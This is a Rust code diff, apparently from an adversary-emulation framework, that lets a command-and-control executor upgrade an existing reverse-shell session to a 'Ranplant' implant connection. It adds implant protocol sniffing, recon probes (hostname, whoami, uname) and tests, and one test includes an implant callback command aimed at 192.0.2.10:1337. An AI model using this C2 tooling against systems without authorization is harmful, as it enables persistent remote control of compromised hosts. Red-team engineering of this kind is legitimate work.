@@ -750,6 +750,10 @@ impl C2Executor {
                 self.stop_listener(cmd, listener).await
             }
             ExecutionOperation::KillSession { session } => self.kill_session(cmd, session).await,
+            ExecutionOperation::StartRanplantSession { listener_port, .. } => {
+                self.start_ranplant_session(cmd, output, *listener_port)
+                    .await
+            }
             ExecutionOperation::StartRedirector {
                 play_id,
                 remote_port,
@@ -1005,6 +1009,138 @@ impl C2Executor {
             fail_reason: String::new(),
             session_connected: None,
         }
+    }
+
+    /// Launch Ranplant through an existing session, wait for its independently
+    /// accepted connection, then retire the source session. Waiting until the
+    /// launch command has completed avoids closing the shell while it is still
+    /// returning the handshake result to Ran.
+    async fn start_ranplant_session(
+        &self,
+        cmd: &ExecTtp,
+        output: OutputSink,
+        listener_port: u16,
+    ) -> TtpExecuted {
+        let source_backend = match self.select_backend(cmd).await {
+            Ok(backend) => backend,
+            Err(reason) => return failed_result(cmd, &reason),
+        };
+        let source_backend_id = self
+            .backends
+            .read()
+            .await
+            .iter()
+            .find_map(|(id, backend)| Arc::ptr_eq(backend, &source_backend).then(|| id.clone()))
+            .unwrap_or_else(|| cmd.exec_system_id.clone());
+        let expected_hostname = cmd
+            .args
+            .get("POD_NAME")
+            .or_else(|| cmd.args.get("HOSTNAME"))
+            .map(|value| value.trim().to_ascii_lowercase())
+            .filter(|value| !value.is_empty());
+        let mut session_events = self.event_bus.subscribe();
+
+        let mut result = source_backend.execute_streaming(cmd, output).await;
+        result.session_connected = None;
+        if !result.success {
+            return result;
+        }
+
+        let connected = tokio::time::timeout(Duration::from_secs(10), async {
+            loop {
+                match session_events.recv().await {
+                    Ok(C2Event::SessionConnected {
+                        backend_id,
+                        target_entity_id,
+                        hostname,
+                        kind,
+                        port: Some(port),
+                        ..
+                    }) if kind == "ranplant"
+                        && port == listener_port
+                        && backend_id != source_backend_id
+                        && expected_hostname
+                            .as_ref()
+                            .is_none_or(|expected| hostname.eq_ignore_ascii_case(expected)) =>
+                    {
+                        break Ok((backend_id, target_entity_id));
+                    }
+                    Ok(_) => {}
+                    Err(broadcast::error::RecvError::Lagged(_)) => {}
+                    Err(broadcast::error::RecvError::Closed) => {
+                        break Err("session event stream closed".to_string());
+                    }
+                }
+            }
+        })
+        .await;
+
+        let (ranplant_backend_id, target_entity_id) = match connected {
+            Ok(Ok(connected)) => connected,
+            Ok(Err(reason)) => {
+                result.success = false;
+                result.exit_code = 1;
+                result.fail_reason = format!(
+                    "Ranplant launch completed but its session could not be confirmed: {reason}"
+                );
+                return result;
+            }
+            Err(_) => {
+                result.success = false;
+                result.exit_code = 1;
+                result.fail_reason = format!(
+                    "Ranplant launch completed but no Ranplant session connected on port {listener_port} within 10s"
+                );
+                return result;
+            }
+        };
+
+        let retire_source = source_backend_id.starts_with("session/") && cmd.exec_chain.len() == 1;
+        let removed_source = if retire_source {
+            let mut backends = self.backends.write().await;
+            match backends.get(&source_backend_id) {
+                Some(current) if Arc::ptr_eq(current, &source_backend) => {
+                    backends.remove(&source_backend_id)
+                }
+                _ => None,
+            }
+        } else {
+            None
+        };
+
+        let retirement = if !retire_source {
+            format!(
+                "source execution channel {source_backend_id} was retained because it is not a direct target session"
+            )
+        } else if let Some(source) = removed_source {
+            match source.close().await {
+                Ok(()) => {
+                    let _ = self
+                        .event_bus
+                        .publish(C2Event::SessionKilled {
+                            backend_id: source_backend_id.clone(),
+                        })
+                        .await;
+                    format!("superseded and closed source session {source_backend_id}")
+                }
+                Err(error) => {
+                    self.backends
+                        .write()
+                        .await
+                        .insert(source_backend_id.clone(), source);
+                    format!(
+                        "Ranplant connected, but source session {source_backend_id} could not be closed: {error}"
+                    )
+                }
+            }
+        } else {
+            format!("source session {source_backend_id} was already unavailable")
+        };
+
+        result.results.push(format!(
+            "Ranplant session {ranplant_backend_id} established for {target_entity_id}; {retirement}"
+        ));
+        result
     }
 
     /// Stand up a redirector:
@@ -1884,49 +2020,90 @@ async fn accept_session_loop(
     listener: tokio::net::TcpListener,
     spec: ListenerSpec,
 ) {
-    use crate::ShellSession;
+    use crate::{RunnerSession, ShellSession};
 
     let ListenerSpec {
-        backend_id,
+        backend_id: listener_backend_id,
         target_entity_id,
         port,
         ..
     } = spec;
-
     loop {
         match listener.accept().await {
             Ok((stream, peer)) => {
-                tracing::info!(%peer, %backend_id, "incoming shell connection; running init");
-                let session = match ShellSession::from_incoming(stream, &backend_id).await {
-                    Ok(s) => s,
-                    Err(e) => {
-                        tracing::warn!(%peer, error = %e, "shell init failed; waiting for next connection");
-                        continue;
-                    }
+                let is_ranplant = stream_starts_with_ranplant(&stream).await;
+                let backend_id = listener_connection_backend_id(&listener_backend_id, is_ranplant);
+                let (backend, health, hostname, user, os, session_kind): (
+                    Arc<dyn C2Backend>,
+                    tokio::sync::watch::Receiver<crate::shell_session::SessionHealth>,
+                    String,
+                    String,
+                    String,
+                    &'static str,
+                ) = if is_ranplant {
+                    tracing::info!(%peer, %backend_id, "incoming Ranplant connection; negotiating protocol");
+                    let (session, identity) = match RunnerSession::from_incoming(
+                        stream,
+                        &backend_id,
+                    )
+                    .await
+                    {
+                        Ok(value) => value,
+                        Err(error) => {
+                            tracing::warn!(%peer, %error, "Ranplant negotiation failed; waiting for next connection");
+                            continue;
+                        }
+                    };
+                    tracing::info!(
+                        %peer,
+                        %backend_id,
+                        runner_version = %identity.runner_version,
+                        kernel_os = %identity.os,
+                        os_release = ?identity.os_release,
+                        arch = %identity.arch,
+                        capabilities = ?identity.capabilities,
+                        "Ranplant session ready"
+                    );
+                    let health = session.subscribe_health();
+                    let discovered_os = identity.display_os();
+                    (
+                        Arc::new(session),
+                        health,
+                        identity.hostname,
+                        identity.user,
+                        discovered_os,
+                        "ranplant",
+                    )
+                } else {
+                    tracing::info!(%peer, %backend_id, "incoming shell connection; running init");
+                    let session = match ShellSession::from_incoming(stream, &backend_id).await {
+                        Ok(session) => session,
+                        Err(error) => {
+                            tracing::warn!(%peer, %error, "shell init failed; waiting for next connection");
+                            continue;
+                        }
+                    };
+                    tracing::info!(%peer, %backend_id, "shell init complete; probing hostname/whoami/uname");
+                    let hostname = session.run_raw("hostname").await.unwrap_or_else(|error| {
+                        tracing::warn!(%peer, %error, "hostname probe failed");
+                        "unknown".to_string()
+                    });
+                    tracing::info!(%peer, %backend_id, %hostname, "hostname probe done");
+                    let user = session.run_raw("whoami").await.unwrap_or_else(|error| {
+                        tracing::warn!(%peer, %error, "whoami probe failed");
+                        String::new()
+                    });
+                    let os = session.run_raw("uname").await.unwrap_or_else(|error| {
+                        tracing::warn!(%peer, %error, "uname probe failed");
+                        String::new()
+                    });
+                    tracing::info!(%peer, %backend_id, %hostname, %user, %os, "probes complete");
+                    let health = session.subscribe_health();
+                    (Arc::new(session), health, hostname, user, os, "tcp")
                 };
-                tracing::info!(%peer, %backend_id, "shell init complete; probing hostname/whoami/uname");
-
-                // Probe the shell for its target identity and operating system.
-                let hostname = session.run_raw("hostname").await.unwrap_or_else(|e| {
-                    tracing::warn!(%peer, error = %e, "hostname probe failed");
-                    "unknown".to_string()
-                });
-                tracing::info!(%peer, %backend_id, %hostname, "hostname probe done");
-                let user = session.run_raw("whoami").await.unwrap_or_else(|e| {
-                    tracing::warn!(%peer, error = %e, "whoami probe failed");
-                    String::new()
-                });
-                let os = session.run_raw("uname").await.unwrap_or_else(|e| {
-                    tracing::warn!(%peer, error = %e, "uname probe failed");
-                    String::new()
-                });
-                tracing::info!(%peer, %backend_id, %hostname, %user, %os, "probes complete");
 
                 let target_entity_id = format!("node/{}", hostname.to_lowercase());
 
-                let session = Arc::new(session);
-                let health = session.subscribe_health();
-                let backend: Arc<dyn C2Backend> = session;
                 backends
                     .write()
                     .await
@@ -1938,6 +2115,7 @@ async fn accept_session_loop(
                         hostname,
                         user,
                         os,
+                        kind: session_kind.to_string(),
                         port: Some(port),
                     })
                     .await;
@@ -1956,7 +2134,7 @@ async fn accept_session_loop(
                 listeners.write().await.remove(&port);
                 let _ = event_bus
                     .publish(C2Event::SessionLost {
-                        backend_id: backend_id.clone(),
+                        backend_id: listener_backend_id.clone(),
                         target_entity_id: target_entity_id.clone(),
                     })
                     .await;
@@ -1964,6 +2142,30 @@ async fn accept_session_loop(
             }
         }
     }
+}
+
+fn listener_connection_backend_id(listener_backend_id: &str, is_ranplant: bool) -> String {
+    if is_ranplant {
+        format!("{listener_backend_id}-ranplant")
+    } else {
+        listener_backend_id.to_string()
+    }
+}
+
+async fn stream_starts_with_ranplant(stream: &tokio::net::TcpStream) -> bool {
+    let probe = async {
+        let mut prefix = [0_u8; ranplant_protocol::MAGIC.len()];
+        loop {
+            match stream.peek(&mut prefix).await {
+                Ok(0) | Err(_) => return false,
+                Ok(read) if read >= prefix.len() => return prefix == ranplant_protocol::MAGIC,
+                Ok(_) => tokio::time::sleep(Duration::from_millis(10)).await,
+            }
+        }
+    };
+    tokio::time::timeout(Duration::from_millis(750), probe)
+        .await
+        .unwrap_or(false)
 }
 
 async fn monitor_session_health(
@@ -2051,14 +2253,26 @@ mod tests {
 
     use super::{
         await_tunnel_ready, drain_child_output, is_existing_redirector_conflict,
-        looks_like_an_error, monitor_session_health, quote_transcript, redirector_forward_spec,
-        tunnel_failure_hint, Backends, C2EventBus, C2Executor, RedirectorProcess, Redirectors,
-        TunnelStartup,
+        listener_connection_backend_id, looks_like_an_error, monitor_session_health,
+        quote_transcript, redirector_forward_spec, tunnel_failure_hint, Backends, C2EventBus,
+        C2Executor, RedirectorProcess, Redirectors, TunnelStartup,
     };
     use super::{C2Backend, C2Event, C2Manager, ExecTtp, TtpExecuted, BUILTIN_C2_ID};
     use crate::ExecutionOperation;
 
     static LISTENER_TEST_LOCK: Mutex<()> = Mutex::const_new(());
+
+    #[test]
+    fn listener_transports_receive_stable_distinct_backend_ids() {
+        assert_eq!(
+            listener_connection_backend_id("session/c2-ran-1337", false),
+            "session/c2-ran-1337"
+        );
+        assert_eq!(
+            listener_connection_backend_id("session/c2-ran-1337", true),
+            "session/c2-ran-1337-ranplant"
+        );
+    }
 
     struct MockBackend {
         marker: String,
@@ -2070,6 +2284,12 @@ mod tests {
     }
 
     struct CloseableBackend {
+        closed: Arc<AtomicBool>,
+    }
+
+    struct UpgradeSourceBackend {
+        started: mpsc::UnboundedSender<()>,
+        release: Arc<Semaphore>,
         closed: Arc<AtomicBool>,
     }
 
@@ -2235,6 +2455,108 @@ mod tests {
             self.closed.store(true, Ordering::SeqCst);
             Ok(())
         }
+    }
+
+    #[async_trait::async_trait]
+    impl C2Backend for UpgradeSourceBackend {
+        async fn execute(&self, cmd: &ExecTtp) -> TtpExecuted {
+            self.started
+                .send(())
+                .expect("test receiver should remain open");
+            let permit = self.release.acquire().await.expect("semaphore is open");
+            permit.forget();
+            TtpExecuted {
+                id: cmd.id.clone(),
+                success: true,
+                results: vec![],
+                exit_code: 0,
+                fail_reason: String::new(),
+                session_connected: None,
+            }
+        }
+
+        async fn close(&self) -> Result<(), String> {
+            self.closed.store(true, Ordering::SeqCst);
+            Ok(())
+        }
+    }
+
+    #[tokio::test]
+    async fn ranplant_upgrade_closes_source_after_launch_and_reports_handoff() {
+        let closed = Arc::new(AtomicBool::new(false));
+        let release = Arc::new(Semaphore::new(0));
+        let (started_tx, mut started_rx) = mpsc::unbounded_channel();
+        let source: Arc<dyn C2Backend> = Arc::new(UpgradeSourceBackend {
+            started: started_tx,
+            release: release.clone(),
+            closed: closed.clone(),
+        });
+        let mut backends = HashMap::new();
+        backends.insert("session/c2-ran-1337".to_string(), source);
+
+        let (handle, events, manager) = C2Manager::new_with_backends(16, backends);
+        let mut rx = events.subscribe();
+        let manager_task = tokio::spawn(manager.run());
+
+        let mut cmd = exec_cmd("session/c2-ran-1337");
+        cmd.id = "cmd-upgrade".to_string();
+        cmd.operation = ExecutionOperation::StartRanplantSession {
+            command: "ranplant connect --host 192.0.2.10 --port 1337 --detach".to_string(),
+            listener_port: 1337,
+        };
+        handle.send(cmd).await.expect("upgrade should queue");
+        started_rx.recv().await.expect("source launch should start");
+
+        handle
+            .register_backend(
+                "session/c2-ran-1337-ranplant",
+                Arc::new(MockBackend {
+                    marker: "ranplant".to_string(),
+                }),
+            )
+            .await;
+        events
+            .publish(C2Event::SessionConnected {
+                backend_id: "session/c2-ran-1337-ranplant".to_string(),
+                target_entity_id: "node/worker".to_string(),
+                hostname: "worker".to_string(),
+                user: "root".to_string(),
+                os: "Debian GNU/Linux 12 (bookworm)".to_string(),
+                kind: "ranplant".to_string(),
+                port: Some(1337),
+            })
+            .await
+            .expect("connection event should publish");
+        assert!(!closed.load(Ordering::SeqCst));
+        release.add_permits(1);
+
+        let mut execution = None;
+        let mut killed = false;
+        while execution.is_none() || !killed {
+            match rx.recv().await.expect("event bus should remain open") {
+                C2Event::SessionKilled { backend_id } => {
+                    assert_eq!(backend_id, "session/c2-ran-1337");
+                    killed = true;
+                }
+                C2Event::TtpExecuted { event, .. } if event.id == "cmd-upgrade" => {
+                    execution = Some(event);
+                }
+                _ => {}
+            }
+        }
+
+        let execution = execution.expect("upgrade should complete");
+        assert!(execution.success);
+        assert!(execution.results.iter().any(|result| {
+            result.contains("session/c2-ran-1337-ranplant")
+                && result.contains("superseded and closed source session session/c2-ran-1337")
+        }));
+        assert!(closed.load(Ordering::SeqCst));
+
+        drop(handle);
+        manager_task
+            .await
+            .expect("manager should shut down cleanly");
     }
 
     #[tokio::test]
